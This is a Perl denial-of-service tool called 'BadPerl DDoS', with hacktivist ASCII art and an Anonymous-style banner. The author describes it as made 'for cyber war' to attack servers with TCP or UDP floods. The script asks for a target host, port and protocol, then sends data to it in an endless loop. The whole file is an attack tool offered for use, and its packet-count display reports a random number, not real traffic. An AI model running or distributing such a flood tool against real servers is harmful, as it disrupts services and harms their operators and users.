#                              WAR FOR FREEDOM
#                                .,:i777;:                        
#                             7kGXYr:.:rY1Xkv                     
#                          ,FZY:     j     .iFP;                  
#                         0Zi       @B@       .NB.                
#                       .@7        @@vB@        :@i               
#                       @:        @BBG8B@         @:              
#                      kr      1F@B5.LqjB@Su      .@              
#                     ,M       G@B1uLM8LS@@q       PF             
#                     Fu       @8:0Z8ZXZP:B@       iB             
#                     @;     .@BMqOB@B@@ONMB@.     .@             
#                     Br     .riiii::::ii;::;.     .B             
#                     8L                           :@             
#                     :G       rB@r,;v7r.r@@2      2E             
#                      EPr   :MB@@@@@B@B@B@B@Bi  . B.             
#                      :B5 iM@Bqk@B@B@B@@@@PS@B@ivZ2              
#                       @jOB@u   7@@@B@B@Bj   LB@B@               
#                      Lv@@@8r.::r@@B@B@B@7::72Z@@B@              
#                      kNB@@@B1riF@B@B@@@8Li5B@BN@@M              
#                        BB0X@@@B@B@@@B@B@B@B@J.E@8               
#                         @M :kO@B@kMB@OGB@BM1.r@B                
#                          GB@@@BMPXB@BP7MB@B@BBGr                
#                       .:i.EB@BB1FB@B@MGX0N@B@i.::,              
#                     r@B@B@B@B@B@B@MMOBB@MPB@B@B@B@B:   .        
#               OB@B@B@MGZMB@B@B@@@BBMBB@B@B@B@BBMGE@B@B@B@N      
#             :@B@B@B@B@MP2NGBB@B@B@B@B@B@@@@@OZP1kBB@B@B@B@Bi    
#             iB@OLB@BMO@@O1N8BB@BMYvr77jG@@@OGPF8@BMM@@@vMB@,    
#              YBr 7 7B@8BB@NMB@BE 2E8EEj 1@B@ME@@MO@@7 ; i@v     
#               UNBB,:UF@MMB@X  .jSB@B@B@P1i  YB@OMBFu:,@GBu      
#                 v@B@. 1@BMB@                B@MBBF .B@BOi       
#                  i8BGv P@B@B:              i@B@BP LE@M7         
#                    LkMB@B@BJ                7@B@B@MEu           
#                      .2OOF                    qB@S:             
use IO::Socket;

system ('cls');
system ('title BadPerl DDoS');
print "\a
        =========================  ABOUT ===========================

      =================     We do Because We Can     ==================
 
       ======================     © 2016    ==========================
           [----------------------------------------------------]
           [----- Programing : Ace57                       -----]
           [----- Copyright  : ©2017 - We Are Anonymous   -----]
           [----- Contact    : ace.57(at)hackermail.com    -----]
           [----- Type       : Perl                        -----]
           [----- Supporter  : 500.err                  -----]
           [----- Info       : Versi Noob - Update         -----]
           [----------------------------------------------------]
         -+--[N E E D   I N T E R N E T    C O N N E C T I O N]--+-
\n";

print "\n This program made by Ace57 with Hi-Hats Hacker Team. This program made for cyber war that can attack server with TCP or UDP flood. I hope you enjoy this tool #indonesia\n\n";

system ('PAUSE');
system ('cls');

print "\nHost:\a";
chomp ($host = <STDIN>);

system ('cls');

print "\nPort:\a";
chomp ($port = <STDIN>);

system ('cls');

print "\nProtokol (TCP or UDP):\a";
chomp ($proto = <STDIN>);

{

$sock = IO::Socket::INET->new(Proto=>"$proto", PeerAddr=>"$host", PeerPort=>"$port") || die "\nCould not connect to the remote machine. Either the machine is offline or the port is not in use on the selected protocol.\a";

}

Packets:
while (1) {
$size = rand() * 8921873 * 9991988;
print ("Flooding: $host:$port~$proto Packets Sent: $size\n");
send($sock, 0, $size)

}
